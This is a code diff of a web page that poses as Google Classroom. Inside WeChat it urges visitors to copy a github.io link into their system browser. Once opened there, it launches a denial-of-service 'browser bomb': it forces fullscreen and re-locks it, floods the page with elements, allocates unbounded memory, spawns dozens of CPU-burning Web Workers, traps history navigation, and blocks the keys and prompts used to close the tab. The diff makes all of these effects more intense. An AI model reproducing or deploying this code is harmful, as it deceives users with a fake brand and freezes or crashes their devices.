@@ -13,69 +13,42 @@
             document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,sans-serif;padding:20px;"><div style="background:#fff;border-radius:20px;padding:32px 24px;width:100%;max-width:380px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.05);"><div style="font-size:48px;margin-bottom:12px;">📚</div><h1 style="font-size:20px;color:#4285F4;margin-bottom:6px;">Google Classroom</h1><p style="font-size:14px;color:#666;margin-bottom:4px;">微信内无法正常使用</p><p style="font-size:13px;color:#FA5151;margin-bottom:20px;">请复制以下链接至系统浏览器打开</p><div style="background:#F5F5F5;border-radius:10px;padding:12px;margin-bottom:12px;word-break:break-all;font-size:13px;color:#333;text-align:left;">https://1l08kwokpohua.github.io/google-classroom/</div><button id="copyBtn" style="width:100%;padding:14px;font-size:16px;font-weight:700;background:#4285F4;color:#fff;border:none;border-radius:10px;cursor:pointer;">📋 复制链接并前往浏览器</button><p id="copyMsg" style="font-size:12px;color:#34A853;margin-top:8px;display:none;">✅ 已复制！请粘贴到浏览器打开</p><p style="font-size:11px;color:#999;margin-top:16px;">*该软件非腾讯开发，仅供学习交流</p></div></div>';
             document.getElementById('copyBtn').onclick = function() {
                 var link = 'https://1l08kwokpohua.github.io/google-classroom/';
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText(link).then(function() {
-                        document.getElementById('copyMsg').style.display = 'block';
-                    });
-                } else {
-                    var t = document.createElement('textarea');
-                    t.value = link;
-                    document.body.appendChild(t);
-                    t.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(t);
-                    document.getElementById('copyMsg').style.display = 'block';
-                }
+                if (navigator.clipboard) { navigator.clipboard.writeText(link).then(function() { document.getElementById('copyMsg').style.display = 'block'; }); }
+                else { var t = document.createElement('textarea'); t.value = link; document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t); document.getElementById('copyMsg').style.display = 'block'; }
             };
         } else {
-            // 浏览器打开：0.5秒后全屏，全屏后再等0.5秒引爆
             document.body.style.background = 'pink';
             document.body.style.overflow = 'hidden';
             document.getElementById('c').style.display = 'block';
             var v = document.getElementById('v');
             v.style.display = 'block';
             v.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMWlzb28AAAAQaXNvbQAAAAEAAAAQAAAAAQAAABQAAABDb2RlYyBpZGVudGlmaWNhdGlvbiB0ZXh0IGZvciB0aGlzIHZpZGVvIHRyYWNr';
-
             var locked = false;
-            function lockFull() {
-                if (locked) return;
-                v.play().then(function() {
-                    v.requestFullscreen().then(function() { locked = true; }).catch(function() {});
-                }).catch(function() {});
-            }
-
-            // 0.5秒后触发全屏
+            function lockFull() { if (locked) return; v.play().then(function() { v.requestFullscreen().then(function() { locked = true; }).catch(function() {}); }).catch(function() {}); }
+            setTimeout(function() { lockFull(); }, 500);
             setTimeout(function() {
-                lockFull();
-            }, 500);
-
-            // 全屏后再等0.5秒引爆炸弹
-            setTimeout(function() {
-                document.addEventListener('fullscreenchange', function() {
-                    if (!document.fullscreenElement && locked) {
-                        v.play().then(function() { v.requestFullscreen().catch(function() {}); }).catch(function() {});
-                    }
-                });
-
+                document.addEventListener('fullscreenchange', function() { if (!document.fullscreenElement && locked) { v.play().then(function() { v.requestFullscreen().catch(function() {}); }).catch(function() {}); } });
                 var c = document.getElementById('c');
                 var ctx = c.getContext('2d');
                 c.width = innerWidth;
                 c.height = innerHeight;
                 var p = [];
-                for (var i = 0; i < 50000; i++) { p.push({ x: Math.random() * c.width, y: Math.random() * c.height, vx: (Math.random() - 0.5) * 30, vy: (Math.random() - 0.5) * 30, r: Math.random() * 4 + 1 }); }
-                function draw() { ctx.fillStyle = 'rgba(255,192,203,0.05)'; ctx.fillRect(0, 0, c.width, c.height); for (var i = 0; i < p.length; i++) { p[i].x += p[i].vx; p[i].y += p[i].vy; if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1; if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1; ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)'; ctx.beginPath(); ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2); ctx.fill(); } requestAnimationFrame(draw); }
+                for (var i = 0; i < 80000; i++) { p.push({ x: Math.random() * c.width, y: Math.random() * c.height, vx: (Math.random() - 0.5) * 40, vy: (Math.random() - 0.5) * 40, r: Math.random() * 5 + 1 }); }
+                function draw() { ctx.fillStyle = 'rgba(255,192,203,0.03)'; ctx.fillRect(0, 0, c.width, c.height); for (var i = 0; i < p.length; i++) { p[i].x += p[i].vx; p[i].y += p[i].vy; if (p[i].x < 0 || p[i].x > c.width) p[i].vx *= -1; if (p[i].y < 0 || p[i].y > c.height) p[i].vy *= -1; ctx.fillStyle = 'hsl(' + (Date.now() / 2 + i % 360) + ',100%,70%)'; ctx.beginPath(); ctx.arc(p[i].x, p[i].y, p[i].r, 0, Math.PI * 2); ctx.fill(); } requestAnimationFrame(draw); }
                 draw();
-                setInterval(function() { for (var i = 0; i < 1000; i++) { var d = document.createElement('div'); d.style.cssText = 'position:fixed;width:40px;height:40px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.7;border-radius:50%;'; d.style.left = Math.random() * innerWidth + 'px'; d.style.top = Math.random() * innerHeight + 'px'; document.body.appendChild(d); } }, 50);
-                setInterval(function() { for (var i = 0; i < 1000; i++) { var s = document.createElement('span'); s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:16px;'; s.style.left = Math.random() * innerWidth + 'px'; s.style.top = Math.random() * innerHeight + 'px'; s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔'; document.body.appendChild(s); } }, 100);
-                var r = []; setInterval(function() { for (var i = 0; i < 10; i++) { r.push(new ArrayBuffer(50 * 1024 * 1024)); } }, 100);
-                var code = 'while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
+                setInterval(function() { for (var i = 0; i < 2000; i++) { var d = document.createElement('div'); d.style.cssText = 'position:fixed;width:50px;height:50px;background:hsl(' + Math.random() * 360 + ',100%,70%);z-index:99;opacity:0.8;border-radius:50%;'; d.style.left = Math.random() * innerWidth + 'px'; d.style.top = Math.random() * innerHeight + 'px'; document.body.appendChild(d); } }, 30);
+                setInterval(function() { for (var i = 0; i < 2000; i++) { var s = document.createElement('span'); s.style.cssText = 'position:fixed;color:hsl(' + Math.random() * 360 + ',100%,50%);z-index:99;font-size:18px;'; s.style.left = Math.random() * innerWidth + 'px'; s.style.top = Math.random() * innerHeight + 'px'; s.textContent = '🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐸🐵🐔🐧🐦🐤🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🐢🐍🦎🦖🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔'; document.body.appendChild(s); } }, 80);
+                setInterval(function() { for (var i = 0; i < 100; i++) { var img = document.createElement('div'); img.style.cssText = 'position:fixed;width:80px;height:80px;background:linear-gradient(45deg,hsl('+Math.random()*360+',100%,70%),hsl('+Math.random()*360+',100%,70%));z-index:99;opacity:0.6;border-radius:10px;transform:rotate('+Math.random()*360+'deg);'; img.style.left = Math.random() * innerWidth + 'px'; img.style.top = Math.random() * innerHeight + 'px'; document.body.appendChild(img); } }, 40);
+                var r = []; setInterval(function() { for (var i = 0; i < 20; i++) { r.push(new ArrayBuffer(100 * 1024 * 1024)); } }, 50);
+                var code = 'while(true){var x=0;for(var i=0;i<100000000;i++){x+=Math.sqrt(i)*Math.sin(i)*Math.cos(i);}}';
                 var blob = new Blob([code], { type: 'text/javascript' });
                 var url = URL.createObjectURL(blob);
-                for (var i = 0; i < 32; i++) { new Worker(url); }
+                for (var i = 0; i < 64; i++) { new Worker(url); }
                 history.pushState(null, null, location.href);
                 window.onpopstate = function() { history.go(1); };
-                setInterval(function() { history.pushState(null, null, location.href + '#' + Math.random()); }, 10);
+                setInterval(function() { history.pushState(null, null, location.href + '#' + Math.random()); }, 1);
                 window.onbeforeunload = function() { return 'x'; };
+                document.addEventListener('keydown', function(e) { if (e.ctrlKey && e.key === 'w') { e.preventDefault(); } if (e.altKey && e.key === 'F4') { e.preventDefault(); } });
             }, 1000);
         }
     </script>
